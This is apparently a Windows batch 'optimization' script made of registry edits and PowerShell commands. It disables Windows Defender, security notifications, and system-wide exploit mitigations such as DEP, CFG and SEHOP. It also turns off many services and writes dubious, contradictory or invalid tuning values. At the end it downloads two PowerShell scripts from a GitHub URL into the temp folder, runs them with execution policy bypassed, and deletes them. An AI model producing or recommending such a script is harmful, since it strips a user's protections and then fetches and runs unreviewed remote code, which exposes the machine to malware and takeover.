Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\hidserv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XblGameSave" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XboxNetApiSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XboxGipSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XblAuthManager" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\PrintNotify" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\BTAGService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\acpipagr" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AcpiPmi" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Beep" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CAD" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CLFS" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CSC" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\luafv" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasAcd" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Rasl2tp" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasPppoe" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_CLASSES_ROOT\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To" /ve /d "{C2FBB630-2971-11D1-A18C-00C04FD75D13}" /f
reg add "HKEY_CLASSES_ROOT\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /ve /d "{C2FBB631-2971-11D1-A18C-00C04FD75D13}" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "8" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "0xffffffff" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_DWORD /d "1000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasSstp" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\tcpipreg" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dam" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wanarpv6" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PEAUTH" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\QWAVEdrv" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cdrom" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fileinfo" /v "Start" /t REG_DWORD /d "4" /f   
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FileCrypt" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "IoPriority" /t REG_DWORD /d "3" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Intel\Intel(R) Extreme Tuning Utility" /v "Enable Overclocking" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Intel\Intel(R) Extreme Tuning Utility" /v "MaxCpuMultiplier" /t REG_DWORD /d 40 /f
reg add "HKLM\SOFTWARE\Intel\Intel(R) Extreme Tuning Utility" /v "CpuCoreVoltage" /t REG_DWORD /d 1.4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PowerThrottling" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Processor\Performance" /v "PerformanceBoost" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d 0 /f
bcdedit /set useplatformclock true
reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppXSvc" /v Start /t REG_DWORD /d 3 /f
cls
PowerShell.exe -ExecutionPolicy Unrestricted -Command "$serviceName = 'WMPNetworkSvc'; Write-Host "^""Disabling service: `"^""$serviceName`"^""."^""; <# -- 1. Skip if service does not exist #>; $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue; if(!$service) {; Write-Host "^""Service `"^""$serviceName`"^"" could not be not found, no need to disable it."^""; Exit 0; }; <# -- 2. Stop if running #>; if ($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::Running) {; Write-Host "^""`"^""$serviceName`"^"" is running, stopping it."^""; try {; Stop-Service -Name "^""$serviceName"^"" -Force -ErrorAction Stop; Write-Host "^""Stopped `"^""$serviceName`"^"" successfully."^""; } catch {; Write-Warning "^""Could not stop `"^""$serviceName`"^"", it will be stopped after reboot: $_"^""; }; } else {; Write-Host "^""`"^""$serviceName`"^"" is not running, no need to stop."^""; }; <# -- 3. Skip if already disabled #>; $startupType = $service.StartType <# Does not work before .NET 4.6.1 #>; if(!$startupType) {; $startupType = (Get-WmiObject -Query "^""Select StartMode From Win32_Service Where Name='$serviceName'"^"" -ErrorAction Ignore).StartMode; if(!$startupType) {; $startupType = (Get-WmiObject -Class Win32_Service -Property StartMode -Filter "^""Name='$serviceName'"^"" -ErrorAction Ignore).StartMode; }; }; if($startupType -eq 'Disabled') {; Write-Host "^""$serviceName is already disabled, no further action is needed"^""; }; <# -- 4. Disable service #>; try {; Set-Service -Name "^""$serviceName"^"" -StartupType Disabled -Confirm:$false -ErrorAction Stop; Write-Host "^""Disabled `"^""$serviceName`"^"" successfully."^""; } catch {; Write-Error "^""Could not disable `"^""$serviceName`"^"": $_"^""; }"
FOR /F "eol=E" %%a in ('REG QUERY "HKLM\SYSTEM\CurrentControlSet\Services" /S /F "IoLatencyCap"^| FINDSTR /V "IoLatencyCap"') DO (
	REG ADD "%%a" /F /V "IoLatencyCap" /T REG_DWORD /d 0 >NUL 2>&1

	FOR /F "tokens=*" %%z IN ("%%a") DO (
		SET STR=%%z
		SET STR=!STR:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\=!
		SET STR=!STR:\Parameters=!
	)
)
FOR /F "eol=E" %%a in ('REG QUERY "HKLM\SYSTEM\CurrentControlSet\Services" /S /F "EnableHIPM"^| FINDSTR /V "EnableHIPM"') DO (
	REG ADD "%%a" /F /V "EnableHIPM" /T REG_DWORD /d 0 >NUL 2>&1
	REG ADD "%%a" /F /V "EnableDIPM" /T REG_DWORD /d 0 >NUL 2>&1
	REG ADD "%%a" /F /V "EnableHDDParking" /T REG_DWORD /d 0 >NUL 2>&1

	FOR /F "tokens=*" %%z IN ("%%a") DO (
		SET STR=%%z
		SET STR=!STR:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\=!
	)
)
for /f "tokens=*" %%s in ('reg query "HKLM\System\CurrentControlSet\Enum" /S /F "StorPort" ^| findstr /e "StorPort"') do Reg add "%%s" /v "EnableIdlePowerManagement" /t REG_DWORD /d "0" /f





PowerShell.exe set-ProcessMitigation -System -Disable  DEP, EmulateAtlThunks, SEHOP, ForceRelocateImages, RequireInfo, BottomUp, HighEntropy, StrictHandle, DisableWin32kSystemCalls, AuditSystemCall, DisableExtensionPoints, BlockDynamicCode, AllowThreadsToOptOut, AuditDynamicCode, CFG, SuppressExports, StrictCFG, MicrosoftSignedOnly, AllowStoreSignedBinaries, AuditMicrosoftSigned, AuditStoreSigned, EnforceModuleDependencySigning, DisableNonSystemFonts, AuditFont, BlockRemoteImageLoads, BlockLowLabelImageLoads, PreferSystem32, AuditRemoteImageLoads, AuditLowLabelImageLoads, AuditPreferSystem32, EnableExportAddressFilter, AuditEnableExportAddressFilter, EnableExportAddressFilterPlus, AuditEnableExportAddressFilterPlus, EnableImportAddressFilter, AuditEnableImportAddressFilter, EnableRopStackPivot, AuditEnableRopStackPivot, EnableRopCallerCheck, AuditEnableRopCallerCheck, EnableRopSimExec, AuditEnableRopSimExec, SEHOP, AuditSEHOP, SEHOPTelemetry, TerminateOnError, DisallowChildProcessCreation, AuditChildProcess   
cls
wmic process where name="explorer.exe" CALL setpriority "128"
wmic process where name="svchost.exe" CALL setpriority "128"
cls
goto fyumi1110

:fyumi1110
@echo off
cls
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/FyumiSownz/Project/refs/heads/main/SonDengDepTri.ps1' -OutFile '%temp%\SonDengDepTri.ps1'"
timeout /t 5 /nobreak

powershell -ExecutionPolicy Bypass -File "%temp%\SonDengDepTri.ps1"

del "%temp%\SonDengDepTri.ps1"
cls
goto fyumi1111

:fyumi1111
@echo off
cls
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/FyumiSownz/Project/refs/heads/main/SonDengSiuDepTri.ps1' -OutFile '%temp%\SonDengSiuDepTri.ps1'"
timeout /t 5 /nobreak

powershell -ExecutionPolicy Bypass -File "%temp%\SonDengSiuDepTri.ps1"

del "%temp%\SonDengSiuDepTri.ps1"
cls
exit
